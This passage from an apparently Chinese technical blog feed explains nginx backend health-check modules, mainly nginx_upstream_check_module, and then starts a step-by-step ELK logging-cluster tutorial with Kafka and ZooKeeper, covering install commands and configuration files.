指令、proxy_read_timeout指令，通过将他们的值调低来发现不健康节点，进而将请求往健康节点转移。</span><br><span class="line">       以上就是nginx自带的两个和后端健康检查相关的模块。</span><br></pre></td></tr></table></figure>

<h3 id="nginx-upstream-check-module模块"><a href="#nginx-upstream-check-module模块" class="headerlink" title="nginx_upstream_check_module模块"></a>nginx_upstream_check_module模块</h3><p>除了自带的上述模块，还有一个更专业的模块，来专门提供负载均衡器内节点的健康检查的。这个就是淘宝技术团队开发的 nginx 模块 nginx_upstream_check_module，通过它可以用来检测后端 realserver 的健康状态。如果后端 realserver 不可用，则所以的请求就不会转发到该节点上。</p>
<p>在淘宝自己的 tengine 上是自带了该模块的，大家可以访问淘宝tengine的官网来获取该版本的nginx，官方地址：<a href="http://tengine.taobao.org/" target="_blank" rel="noopener">http://tengine.taobao.org/ </a>。</p>
<p>如果我们没有使用淘宝的 tengine 的话，可以通过补丁的方式来添加该模块到我们自己的 nginx 中。我们业务线上就是采用该方式进行添加的。</p>
<p>下面是部署流程！</p>
<h4 id="下载nginx-upstream-check-module模块"><a href="#下载nginx-upstream-check-module模块" class="headerlink" title="下载nginx_upstream_check_module模块"></a>下载nginx_upstream_check_module模块</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd /usr/local/src</span><br><span class="line">wget https://codeload.github.com/yaoweibin/nginx_upstream_check_module/zip/master</span><br><span class="line">unzip master</span><br><span class="line">[root@localhost /usr/local/src]# ll -d nginx_upstream_check_module-master</span><br><span class="line">drwxr-xr-x. 6 root root 4096 Dec  1 02:28 nginx_upstream_check_module-master</span><br></pre></td></tr></table></figure>

<h4 id="为nginx打补丁"><a href="#为nginx打补丁" class="headerlink" title="为nginx打补丁"></a>为nginx打补丁</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost /usr/local/src]# cd nginx-1.6.0 # 进入nginx的源码目录</span><br><span class="line">[root@localhost nginx-1.6.0]# patch -p1 &lt; ../nginx_upstream_check_module-master/check_1.5.12+.patch</span><br><span class="line">[root@localhost nginx-1.6.0]# ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx-1.6.0 --with-http_ssl_module --with-openssl=/usr/local/src/openssl-0.9.8q --with-pcre=/usr/local/src/pcre-8.32 --add-module=/usr/local/src/nginx_concat_module/ --add-module=../nginx_upstream_check_module-master/</span><br><span class="line">make (注意：此处只make，编译参数需要和之前的一样)</span><br><span class="line">[root@localhost nginx-1.6.0]# mv /usr/local/nginx/sbin/nginx /usr/local/nginx/sbin/nginx-1.6.0.bak</span><br><span class="line">[root@localhost nginx-1.6.0]# cp ./objs/nginx /usr/local/nginx/sbin/</span><br><span class="line">[root@localhost nginx-1.6.0]# /usr/local/nginx/sbin/nginx -t  # 检查下是否有问题</span><br><span class="line">[root@localhost nginx-1.6.0]# kill -USR2 `cat /usr/local/nginx/logs/nginx.pid`</span><br></pre></td></tr></table></figure>

<h4 id="在nginx-conf配置文件里面的upstream加入健康检查"><a href="#在nginx-conf配置文件里面的upstream加入健康检查" class="headerlink" title="在nginx.conf配置文件里面的upstream加入健康检查"></a>在nginx.conf配置文件里面的upstream加入健康检查</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">upstream name &#123;</span><br><span class="line">       server 192.168.0.21:80;</span><br><span class="line">       server 192.168.0.22:80;</span><br><span class="line">       check interval=3000 rise=2 fall=5 timeout=1000 type=http;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面 配置的意思是，对name这个负载均衡条目中的所有节点，每个3秒检测一次，请求2次正常则标记 realserver状态为up，如果检测 5 次都失败，则标记 realserver的状态为down，超时时间为1秒。</p>
<p>这里列出 nginx_upstream_check_module 模块所支持的指令意思：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Syntax: check interval=milliseconds [fall=count] [rise=count] [timeout=milliseconds] [default_down=true|false] [type=tcp|http|ssl_hello|mysql|ajp] [port=check_port]</span><br><span class="line">Default: 如果没有配置参数，默认值是：interval=30000 fall=5 rise=2 timeout=1000 default_down=true type=tcp</span><br><span class="line">Context: upstream</span><br></pre></td></tr></table></figure>

<p>该指令可以打开后端服务器的健康检查功能。</p>
<p>指令后面的参数意义是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">  - interval：向后端发送的健康检查包的间隔。</span><br><span class="line">  - fall(fall_count): 如果连续失败次数达到fall_count，服务器就被认为是down。</span><br><span class="line">  - rise(rise_count): 如果连续成功次数达到rise_count，服务器就被认为是up。</span><br><span class="line">  - timeout: 后端健康请求的超时时间。</span><br><span class="line">  - default_down: 设定初始时服务器的状态，如果是true，就说明默认是down的，如果是false，就是up的。默认值是true，也就是一开始服务器认为是不可用，要等健康检查包达到一定成功次数以后才会被认为是健康的。</span><br><span class="line">  - type：健康检查包的类型，现在支持以下多种类型</span><br><span class="line">  - tcp：简单的tcp连接，如果连接成功，就说明后端正常。</span><br><span class="line">  - ssl_hello：发送一个初始的SSL hello包并接受服务器的SSL hello包。</span><br><span class="line">  - http：发送HTTP请求，通过后端的回复包的状态来判断后端是否存活。</span><br><span class="line">  - mysql: 向mysql服务器连接，通过接收服务器的greeting包来判断后端是否存活。</span><br><span class="line">  - ajp：向后端发送AJP协议的Cping包，通过接收Cpong包来判断后端是否存活。</span><br><span class="line">  - port: 指定后端服务器的检查端口。你可以指定不同于真实服务的后端服务器的端口，比如后端提供的是443端口的应用，你可以去检查80端口的状态来判断后端健康状况。默认是0，表示跟后端server提供真实服务的端口一样。该选项出现于Tengine-1.4.0。</span><br><span class="line">Syntax: check_keepalive_requests request_num</span><br><span class="line">Default: 1</span><br><span class="line">Context: upstream</span><br></pre></td></tr></table></figure>

<p>该指令可以配置一个连接发送的请求数，其默认值为1，表示Tengine完成1次请求后即关闭连接。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Syntax: check_http_send http_packet</span><br><span class="line">Default: "GET / HTTP/1.0\r\n\r\n"</span><br><span class="line">Context: upstream</span><br></pre></td></tr></table></figure>

<p>该指令可以配置http健康检查包发送的请求内容。为了减少传输数据量，推荐采用”HEAD”方法。</p>
<p>当采用长连接进行健康检查时，需在该指令中添加keep-alive请求头，如：”HEAD / HTTP/1.1\r\nConnection: keep-alive\r\n\r\n”。 同时，在采用”GET”方法的情况下，请求uri的size不宜过大，确保可以在1个interval内传输完成，否则会被健康检查模块视为后端服务器或网络异常。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Syntax: check_http_expect_alive [ http_2xx | http_3xx | http_4xx | http_5xx ]</span><br><span class="line">Default: http_2xx | http_3xx</span><br><span class="line">Context: upstream</span><br></pre></td></tr></table></figure>

<p>该指令指定HTTP回复的成功状态，默认认为2XX和3XX的状态是健康的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Syntax: check_shm_size size</span><br><span class="line">Default: 1M</span><br><span class="line">Context: http</span><br></pre></td></tr></table></figure>

<p>所有的后端服务器健康检查状态都存于共享内存中，该指令可以设置共享内存的大小。默认是1M，如果你有1千台以上的服务器并在配置的时候出现了错误，就可能需要扩大该内存的大小。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Syntax: check_status [html|csv|json]</span><br><span class="line">Default: check_status html</span><br><span class="line">Context: location</span><br></pre></td></tr></table></figure>

<p>显示服务器的健康状态页面。该指令需要在http块中配置。</p>
<p>在Tengine-1.4.0以后，你可以配置显示页面的格式。支持的格式有: html、csv、 json。默认类型是html。</p>
<p>你也可以通过请求的参数来指定格式，假设‘/status’是你状态页面的URL， format参数改变页面的格式，比如：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/status?format=html</span><br><span class="line"></span><br><span class="line">/status?format=csv</span><br><span class="line"></span><br><span class="line">/status?format=json</span><br></pre></td></tr></table></figure>

<p>同时你也可以通过status参数来获取相同服务器状态的列表，比如：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/status?format=html&amp;status=down</span><br><span class="line"></span><br><span class="line">/status?format=csv&amp;status=up</span><br></pre></td></tr></table></figure>

<p>下面是一个状态也配置的范例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">      server &#123;</span><br><span class="line">       location /nstatus &#123;</span><br><span class="line">         check_status;</span><br><span class="line">         access_log off;</span><br><span class="line">         #allow IP;</span><br><span class="line">         #deny all;</span><br><span class="line">       &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置完毕后，重启nginx。此时通过访问定义好的路径，就可以看到当前 realserver 实时的健康状态啦。效果如下图：<br>realserver 都正常的状态：</p>
<p><img src="/articles/d05be736/1.jpg" alt="img"></p>
<p>一台 realserver 故障的状态：</p>
<p><img src="/articles/d05be736/2.jpg" alt="img"></p>
<p> OK，以上nginx_upstream_check_module模块的相关信息，更多的信息大家可以去该模块的淘宝tengine页面和github上该项目页面去查看，下面是访问地址：</p>
<p><a href="http://tengine.taobao.org/document_cn/http_upstream_check_cn.html" target="_blank" rel="noopener">http://tengine.taobao.org/document_cn/http_upstream_check_cn.html</a></p>
<p><a href="https://github.com/yaoweibin/nginx_upstream_check_module" target="_blank" rel="noopener">https://github.com/yaoweibin/nginx_upstream_check_module</a></p>
<h3 id="ngx-http-healthcheck-module模块"><a href="#ngx-http-healthcheck-module模块" class="headerlink" title="ngx_http_healthcheck_module模块"></a>ngx_http_healthcheck_module模块</h3><p>除了上面两个模块，nginx官方在早期的时候还提供了一个 ngx_http_healthcheck_module 模块用来进行nginx后端节点的健康检查。nginx_upstream_check_module模块就是参照该模块的设计理念进行开发的，因此在使用和效果上都大同小异。但是需要注意的是，ngx_http_healthcheck_module 模块仅仅支持nginx的1.0.0版本，1.1.0版本以后都不支持了！因此，对于目前常见的生产环境上都不会去用了，这里仅仅留个纪念，给大家介绍下这个模块！</p>
<p>   具体的使用方法，这里可以贴出几篇靠谱的博文地址以及官方地址：</p>
<p>​      <a href="http://wiki.nginx.org/HttpHealthcheckModule" target="_blank" rel="noopener">http://wiki.nginx.org/HttpHealthcheckModule</a></p>
<p>​      <a href="https://github.com/cep21/healthcheck_nginx_upstreams/blob/master/README" target="_blank" rel="noopener">https://github.com/cep21/healthcheck_nginx_upstreams/blob/master/README</a></p>
<h2 id="生产环境的实施中需要注意点："><a href="#生产环境的实施中需要注意点：" class="headerlink" title="生产环境的实施中需要注意点："></a>生产环境的实施中需要注意点：</h2><h3 id="主要定义好type。"><a href="#主要定义好type。" class="headerlink" title="主要定义好type。"></a>主要定义好type。</h3><p>由于默认的type是tcp类型，因此假设你服务启动，不管是否初始化完毕，它的端口都会起来，所以此时前段负载均衡器为认为该服务已经可用，其实是不可用状态。</p>
<h3 id="注意check-http-send值的设定。"><a href="#注意check-http-send值的设定。" class="headerlink" title="注意check_http_send值的设定。"></a>注意check_http_send值的设定。</h3><p>由于它的默认值是”GET / HTTP/1.0\r\n\r\n”。假设你的应用是通过<a href="http://ip/name访问的，那么这里你的" target="_blank" rel="noopener">http://ip/name访问的，那么这里你的</a> check_http_send值就需要更改为 “GET /name HTTP/1.0\r\n\r\n”才可以。针对采用长连接进行检查的， 这里增加 keep-alive请求 头，即”HEAD /name HTTP/1.1\r\nConnection: keep-alive\r\n\r\n”。如果你后端的tomcat是基于域名的多虚拟机，此时你需要通过check_http_send定义host，不然每次访问都是失败，范例：check_http_send “GET /mobileapi HTTP/1.0\r\n HOST <a href="http://www.tuicool.com/articles/vuiQry#" target="_blank" rel="noopener">www.redhat.sx\r\n\r\n”;</a></p>
]]></content>
      <categories>
        <category>Web服务</category>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>ELK日志系统最新版本详细教程</title>
    <url>/articles/944dc498.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>为什么要做日志分析平台？</p>
<p>随着业务量的增长，每天业务服务器将会产生上亿条的日志，单个日志文件达几个GB，这时我们发现用Linux自带工具，cat grep awk 分析越来越力不从心了，而且除了服务器日志，还有程序报错日志，分布在不同的服务器，查阅繁琐。</p>
<p><strong>待解决的痛点:</strong></p>
<p>1、大量不同种类的日志成为了运维人员的负担，不方便管理;</p>
<p>2、单个日志文件巨大，无法使用常用的文本工具分析，检索困难;</p>
<p>3、日志分布在多台不同的服务器上，业务一旦出现故障，需要一台台查看日志。</p>
<p>为了解决以上困扰: 接下来我们要一步步构建这个日志分析平台，架构图如下:</p>
<a id="more"></a>

<p>架构图的构建考虑：</p>
<p>1，考虑既能收集日志，又是轻量级的，所耗服务器资源和负载较低。选用filebeat</p>
<p>2,   考虑到高可用和日志数据的安全，加入缓存中间件集群。选用kafka和zookeeper</p>
<p>3,   在kafka集群前面加入logstash进行导入，是为了横向扩展kafka的broker。试想下，添加或减少kafka broker集群节点，需要每台机器上更改filebeat的配置，那就头疼了。</p>
<p>4，在kafka集群后面添加logstash转发层，是为了可以根据kafka集群topic的使用情况横向扩展，负载较高的topic可以适当增加logstash进行处理。</p>
<p>5，es集群负责存储，kibana前端展示和搜索。</p>
<h2 id="架构图："><a href="#架构图：" class="headerlink" title="架构图："></a>架构图：</h2><p><img src="/articles/944dc498/1.png" alt="img"></p>
<p><strong>架构解读 : （整个架构从左到右，总共分为5层）</strong></p>
<p><strong>第一层、数据采集层</strong></p>
<p>最左边的是业务服务器集群，上面安装了filebeat做日志采集，同时把采集的日志分别发送给两个logstash服务。</p>
<p><strong>第二层、数据处理层，数据缓存层</strong></p>
<p>logstash服务把接受到的日志经过格式处理，转存到本地的kafka broker+zookeeper 集群中。</p>
<p><strong>第三层、数据转发层</strong></p>
<p>这个单独的Logstash节点会实时去kafka broker集群拉数据，转发至ES DataNode。</p>
<p><strong>第四层、数据持久化存储</strong></p>
<p>ES DataNode 会把收到的数据，写磁盘，建索引库。</p>
<p><strong>第五层、数据检索，数据展示</strong></p>
<p>ES Master + Kibana 主要协调ES集群，处理数据检索请求，数据展示。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>操作系统环境 : CentOS 7.2</p>
<p>各服务器角色分配 :</p>
<p>3台服务器：</p>
<p>IP : 10.10.0.193</p>
<p>IP : 10.10.0.194</p>
<p>IP : 10.10.0.195</p>
<table>
<thead>
<tr>
<th><strong>IP</strong></th>
<th><strong>角色</strong></th>
<th><strong>所属集群</strong></th>
</tr>
</thead>
<tbody><tr>
<td>10.10.0.193 10.10.0.194</td>
<td>nginx+filebeat nginx+filebeat</td>
<td>业务服务器集群</td>
</tr>
<tr>
<td>10.10.0.193</td>
<td>Logstash+Kafka+ZooKeeper</td>
<td>缓存集群</td>
</tr>
<tr>
<td>10.10.0.194</td>
<td>Logstash+Kafka+ZooKeeper</td>
<td></td>
</tr>
<tr>
<td>10.10.0.195</td>
<td>Kafka+ZooKeeper</td>
<td></td>
</tr>
<tr>
<td>10.10.0.195</td>
<td>Logstash</td>
<td>数据转发</td>
</tr>
<tr>
<td>10.10.0.193</td>
<td>ES DataNode</td>
<td>Elasticsearch 集群</td>
</tr>
<tr>
<td>10.10.0.194</td>
<td>ES DataNode</td>
<td></td>
</tr>
<tr>
<td>10.10.0.195</td>
<td>ES Master+Kibana</td>
<td></td>
</tr>
</tbody></table>
<h2 id="软件包版本和下载网站"><a href="#软件包版本和下载网站" class="headerlink" title="软件包版本和下载网站:"></a>软件包版本和下载网站:</h2><p>jdk-8u161-linux-x64.rpm</p>
<p>node-v8.10.0-linux-x64.tar.xz</p>
<p>nginx-1.12.2.tar.gz</p>
<p>logstash-6.2.2.tar.gz</p>
<p>filebeat-6.2.2-x86_64.rpm</p>
<p>kafka_2.11-1.0.1.tgz</p>
<p>zookeeper-3.4.10.tar.gz</p>
<p>elasticsearch-6.2.2.tar.gz </p>
<p>kibana-6.2.2-linux-x86_64.tar.gz</p>
<p>jdk下载：<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a> </p>
<p>nodejs下载：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></p>
<p>nginx下载：<a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">http://nginx.org/en/download.html</a> </p>
<p>filebeat,logstash,elasticsearch,kibana下载：<a href="https://www.elastic.co/cn/downloads" target="_blank" rel="noopener">https://www.elastic.co/cn/downloads</a> </p>
<p>kafka下载：<a href="http://kafka.apache.org/downloads" target="_blank" rel="noopener">http://kafka.apache.org/downloads</a> </p>
<p>zookeeper下载：<a href="http://zookeeper.apache.org/releases.html#download" target="_blank" rel="noopener">http://zookeeper.apache.org/releases.html#download</a> </p>
<h2 id="安装部署Elasticsearch集群"><a href="#安装部署Elasticsearch集群" class="headerlink" title="安装部署Elasticsearch集群"></a><strong>安装部署Elasticsearch集群</strong></h2><p>ES Master节点 10.10.0.195</p>
<h3 id="安装jdk1-8，elasticsearch"><a href="#安装jdk1-8，elasticsearch" class="headerlink" title="安装jdk1.8，elasticsearch"></a>安装jdk1.8，elasticsearch</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装命令</span></span><br><span class="line">yum install jdk-8u161-linux-x64.rpm -y</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建es用户（从5.0后root不能启动被限制）</span></span><br><span class="line">groupadd es </span><br><span class="line">useradd es </span><br><span class="line">passwd es</span><br><span class="line">更改用户 es 的密码 。  </span><br><span class="line">新的 密码：  </span><br><span class="line">重新输入新的 密码：  </span><br><span class="line">passwd： 所有的身份验证令牌已经成功更新</span><br><span class="line"><span class="meta">#</span><span class="bash">解压包</span></span><br><span class="line">tar -xzvf elasticsearch-6.2.2.tar.gz -C /opt/</span><br><span class="line">mv /opt/elasticsearch-6.2.2  /opt/elasticsearch</span><br><span class="line"><span class="meta">#</span><span class="bash">更改权限</span></span><br><span class="line">chown -R es:es /opt/elasticsearch</span><br></pre></td></tr></table></figure>

<p>验证jdk：</p>
<p><img src="/articles/944dc498/2.png" alt="img"></p>
<h3 id="系统调优，JVM调优"><a href="#系统调优，JVM调优" class="headerlink" title="系统调优，JVM调优"></a><strong>系统调优，JVM调优</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 配置系统最大打开文件描述符数</span></span><br><span class="line">vim /etc/sysctl.conf</span><br><span class="line">vm.max_map_count=262144</span><br><span class="line"><span class="meta">#</span><span class="bash">配置生效</span></span><br><span class="line">sysctl -p</span><br><span class="line"><span class="meta">#</span><span class="bash"> 配置进程最大打开文件描述符</span></span><br><span class="line">vim /etc/security/limits.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> End of file</span></span><br><span class="line">* soft nofile 65536</span><br><span class="line">* hard nofile 131072</span><br><span class="line">* soft nproc 2048</span><br><span class="line">* hard nproc 4096</span><br><span class="line"><span class="meta">#</span><span class="bash">更改配置</span></span><br><span class="line">vim /etc/security/limits.d/20-nproc.conf</span><br><span class="line">*          soft    nproc     4096</span><br><span class="line">root       soft    nproc     unlimited</span><br></pre></td></tr></table></figure>

<h3 id="编写ES-Master节点配置文件"><a href="#编写ES-Master节点配置文件" class="headerlink" title="编写ES Master节点配置文件"></a><strong>编写ES Master节点配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/elasticsearch/config/elasticsearch.yml</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ---------------------------------- Cluster -----------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Use a descriptive name <span class="keyword">for</span> your cluster:</span></span><br><span class="line"> </span><br><span class="line">cluster.name: sunelk</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ------------------------------------ Node ------------------------------------</span></span><br><span class="line">node.name: node-195</span><br><span class="line">node.master: true</span><br><span class="line">node.data: false</span><br><span class="line">node.ingest: false   </span><br><span class="line">search.remote.connect: false</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------- Paths ------------------------------------</span></span><br><span class="line">path.data: /home/es/elasticsearch/data/</span><br><span class="line">path.logs: /home/es/elasticsearch/logs/</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------- Memory -----------------------------------</span></span><br><span class="line">bootstrap.memory_lock: false</span><br><span class="line">bootstrap.system_call_filter: false</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">------------------------------------ Network And HTTP --------------------------</span></span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line">http.port: 9200</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash"> --------------------------------- Discovery ------------------------------------</span></span><br><span class="line">discovery.zen.ping.unicast.hosts: ["10.10.0.193", "10.10.0.194","10.10.0.195"] </span><br><span class="line">discovery.zen.minimum_master_nodes: 2   </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">下面两行配置为haad插件配置，三台服务器一致。      </span></span><br><span class="line">http.cors.enabled: true                                                                                                                                                                                                   </span><br><span class="line">http.cors.allow-origin: "*"</span><br></pre></td></tr></table></figure>

<p>注: path.data、path.logs 这两个参数指定的路径，如果没有需要自己创建，还要赋予权限给es用户。（后面的ES DataNode也同样）</p>
<h3 id="安装head开源插件"><a href="#安装head开源插件" class="headerlink" title="安装head开源插件"></a><strong>安装head开源插件</strong></h3><p>从es6.x后要自己手动编译安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装node</span></span><br><span class="line">tar -xvf node-v8.10.0-linux-x64.tar.xz -C /opt/</span><br><span class="line">mv /opt/node-v8.10.0-linux-x64 /opt/node</span><br><span class="line"><span class="meta">#</span><span class="bash">更改环境变量</span></span><br><span class="line">vim /etc/profile</span><br><span class="line"></span><br><span class="line">export NODEJS_HOME=/opt/node</span><br><span class="line">export PATH=$PATH:$NODEJS_HOME/bin</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta">#</span><span class="bash">下载源码</span></span><br><span class="line">cd /opt/</span><br><span class="line">git clone https://github.com/mobz/elasticsearch-head.git</span><br><span class="line">chown -R es:es elasticsearch-head</span><br><span class="line">su es </span><br><span class="line">cd  elasticsearch-head</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">npm install -g grunt-cli</span><br><span class="line">npm install</span><br><span class="line">npm run start</span><br><span class="line">open http://localhost:9100/</span><br></pre></td></tr></table></figure>

<p>访问,检测插件是否安装成功</p>
<p><a href="http://10.10.0.195:9100" target="_blank" rel="noopener">http://10.10.0.195:9100</a></p>
<p><strong>这时，ES Master已经配置好了。</strong></p>
<h3 id="部署ES-DataNode节点"><a href="#部署ES-DataNode节点" class="headerlink" title="部署ES DataNode节点"></a>部署ES DataNode节点</h3><p>ES DataNode节点 是10.10.0.193和10.10.0.194</p>
<p>安装和系统调优方法同上，插件不用安装，只是配置文件不同。</p>
<p><strong>编写配置文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/elasticsearch/config/elasticsearch.yml</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ---------------------------------- Cluster -----------------------------------</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Use a descriptive name <span class="keyword">for</span> your cluster:</span></span><br><span class="line"> </span><br><span class="line">cluster.name: sunelk</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ------------------------------------ Node ------------------------------------</span></span><br><span class="line">node.name: node-193</span><br><span class="line">node.master: true</span><br><span class="line">node.data: true</span><br><span class="line">node.ingest: false   </span><br><span class="line">search.remote.connect: false</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------- Paths ------------------------------------</span></span><br><span class="line">path.data: /home/es/elasticsearch/data/</span><br><span class="line">path.logs: /home/es/elasticsearch/logs/</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> ----------------------------------- Memory -----------------------------------</span></span><br><span class="line">bootstrap.memory_lock: false</span><br><span class="line">bootstrap.system_call_filter: false</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">------------------------------------ Network And HTTP --------------------------</span></span><br><span class="line">network.host: 0.0.0.0</span><br><span class="line">http.port: 9200</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash"> --------------------------------- Discovery ------------------------------------</span></span><br><span class="line">discovery.zen.ping.unicast.hosts: ["10.10.0.193", "10.10.0.194","10.10.0.195"] </span><br><span class="line">discovery.zen.minimum_master_nodes: 2   </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">下面两行配置为haad插件配置，三台服务器一致。      </span></span><br><span class="line">http.cors.enabled: true                                                                                                                                                                                                   </span><br><span class="line">http.cors.allow-origin: "*</span><br></pre></td></tr></table></figure>

<p><strong>10.10.0.193 也准备好了,10.10.0.194和193配置一样，只需改下node.name</strong></p>
<h3 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.195</span></span><br><span class="line">nohup /opt/elasticsearch/bin/elasticsearch &amp;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.193</span></span><br><span class="line">nohup /opt/elasticsearch/bin/elasticsearch &amp;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 10.10.0.194</span></span><br><span class="line">nohup /opt/elasticsearch/bin/elasticsearch &amp;</span><br></pre></td></tr></table></figure>

<h3 id="访问head插件，查看集群状态"><a href="#访问head插件，查看集群状态" class="headerlink" title="访问head插件，查看集群状态"></a><strong>访问head插件，查看集群状态</strong></h3><p><img src="/articles/944dc498/50.png" alt="img"><strong>此时 Elasticsearch 集群已经准备完成</strong></p>
<h2 id="配置ZooKeeper集群"><a href="#配置ZooKeeper集群" class="headerlink" title="配置ZooKeeper集群"></a><strong>配置ZooKeeper集群</strong></h2><p>配置 10.10.0.193 节点</p>
<h3 id="安装，配置-zookeeper"><a href="#安装，配置-zookeeper" class="headerlink" title="安装，配置 zookeeper"></a><strong>安装，配置 zookeeper</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> zookeeper 依赖 java，如果之前没安装过JDK，则需要安装.</span></span><br><span class="line">rpm -ivh jdk-8u161-linux-x64.rpm</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压程序</span></span><br><span class="line">tar -xzvf zookeeper-3.4.10.tar.gz  -C /opt/</span><br><span class="line">mv /opt/zookeeper-3.4.10 /opt/zookeeper</span><br></pre></td></tr></table></figure>

<h3 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a><strong>编写配置文件</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /opt/zookeeper/conf/zoo.cfg</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of milliseconds of each tick</span></span><br><span class="line">tickTime=2000</span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of ticks that the initial </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> synchronization phase can take</span></span><br><span class="line">initLimit=10</span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of ticks that can pass between </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sending a request and getting an acknowledgement</span></span><br><span class="line">syncLimit=5</span><br><span class="line"><span class="meta">#</span><span class="bash"> the directory <span class="built_in">where</span> the snapshot is stored.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">do</span> not use /tmp <span class="keyword">for</span> storage, /tmp here is just </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> example sakes.</span></span><br><span class="line">dataDir=/tmp/zookeeper</span><br><span class="line"><span class="meta">#</span><span class="bash"> the port at <span class="built_in">which</span> the clients will connect</span></span><br><span class="line">clientPort=2181</span><br><span class="line"><span class="meta">#</span><span class="bash"> the maximum number of client connections.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> increase this <span class="keyword">if</span> you need to handle more clients</span></span><br><span class="line"><span class="meta">#</span><span class="bash">maxClientCnxns=60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Be sure to <span class="built_in">read</span> the maintenance section of the </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> administrator guide before turning on autopurge.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://zookeeper.apache.org/doc/current/zookeeperAdmin.html<span class="comment">#sc_maintenance</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The number of snapshots to retain <span class="keyword">in</span> dataDir</span></span><br><span class="line"><span class="meta">#</span><span class="bash">autopurge.snapRetainCount=3</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Purge task interval <span class="keyword">in</span> hours</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set to <span class="string">"0"</span> to <span class="built_in">disable</span> auto purge feature</span></span><br><span class="line"><span class="meta">#</span><span class="bash">autopurge.purgeInterval=1</span></span><br><span class="line">server.1=10.10.0.193:2888:3888</span><br><span class="line">server.2=10.10.0.194:2888:3888</span><br><span class="line">server.3=10.10.0.195:2888:3888</span><br></pre></td></tr></table></figure>

<p><strong>同步配置文件到其他两台节点</strong></p>
